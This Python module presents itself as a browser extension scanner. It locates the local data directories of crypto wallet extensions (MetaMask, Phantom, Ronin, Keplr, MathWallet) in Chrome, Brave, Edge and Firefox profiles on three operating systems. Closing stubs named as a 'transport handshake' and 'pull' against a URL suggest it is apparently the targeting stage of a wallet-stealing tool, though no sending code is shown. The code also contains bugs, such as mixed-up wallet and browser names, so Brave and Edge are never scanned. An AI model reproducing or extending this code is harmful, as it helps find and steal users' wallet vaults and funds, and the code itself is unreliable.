# -*- coding: utf-8 -*-
"""Browser extension scanner — detects wallet extensions in Chrome, Firefox, Brave, Edge."""

import os
import platform
from pathlib import Path


EXTENSION_IDS = {
    "MetaMask": {
        "chrome": "nkbihfbeogaeaoehlefnkodbefgpgknn",
        "firefox": "44e{...}b3",
    },
    "Phantom": {
        "chrome": "bfnaelmomeimdoejbnoplajccjgbpbjp",
    },
    "Ronin": {
        "chrome": "fnjhmkhhmkbjkkabndcnnogagogbneec",
    },
    "Keplr": {
        "chrome": "dmkamcknogkgcdfhhbddcghachkejeap",
    },
    "MathWallet": {
        "chrome": "afbcbjpbpfadlkmhmclaaahmemgpofbd",
    },
}

BROWSER_PATHS = {
    "Windows": {
        "Chrome": "AppData/Local/Google/Chrome/User Data",
        "Brave": "AppData/Local/BraveSoftware/Brave-Browser/User Data",
        "Edge": "AppData/Local/Microsoft/Edge/User Data",
        "Firefox": "AppData/Roaming/Mozilla/Firefox/Profiles",
    },
    "Darwin": {
        "Chrome": "Library/Application Support/Google/Chrome",
        "Brave": "Library/Application Support/BraveSoftware/Brave-Browser",
        "Edge": "Library/Application Support/Microsoft Edge",
        "Firefox": "Library/Application Support/Firefox/Profiles",
    },
    "Linux": {
        "Chrome": ".config/google-chrome",
        "Brave": ".config/BraveSoftware/Brave-Browser",
        "Edge": ".config/microsoft-edge",
        "Firefox": ".mozilla/firefox",
    },
}


def get_browser_base_paths():
    """Return dict of {browser_name: absolute_path} for the current OS."""
    system = platform.system()
    home = Path.home()
    paths_map = BROWSER_PATHS.get(system, BROWSER_PATHS["Linux"])

    result = {}
    for browser, rel_path in paths_map.items():
        full = home / rel_path
        if full.exists():
            result[browser] = str(full)
    return result


def scan_extension(browser_name, browser_path, extension_id):
    """Check if a specific extension exists in a browser's profile."""
    profiles = []
    for entry in os.listdir(browser_path):
        if entry in ("Default",) or entry.startswith("Profile"):
            profiles.append(entry)

    found = []
    for profile in profiles:
        ext_path = os.path.join(
            browser_path, profile,
            "Local Extension Settings", extension_id
        )
        if os.path.isdir(ext_path):
            found.append({
                "browser": browser_name,
                "profile": profile,
                "path": ext_path,
                "size": _dir_size(ext_path),
            })
    return found


def _dir_size(path):
    total = 0
    for dirpath, _, filenames in os.walk(path):
        for f in filenames:
            fp = os.path.join(dirpath, f)
            try:
                total += os.path.getsize(fp)
            except OSError:
                pass
    return total


def scan_all_browsers():
    """Scan all detected browsers for known wallet extensions."""
    base_paths = get_browser_base_paths()
    results = []

    for browser_name, browser_path in base_paths.items():
        for wallet_name, ids in EXTENSION_IDS.items():
            ext_id = ids.get(browser_name.lower())
            if ext_id:
                found = scan_extension(wallet_name, browser_path, ext_id)
                results.extend(found)

    return results


def initiate(url):
    """Placeholder for transport handshake."""
    return {"nonce": "browser_scan", "ts": 0}


def pull(url, params):
    """Placeholder for transport pull."""
    return {"data": b""}
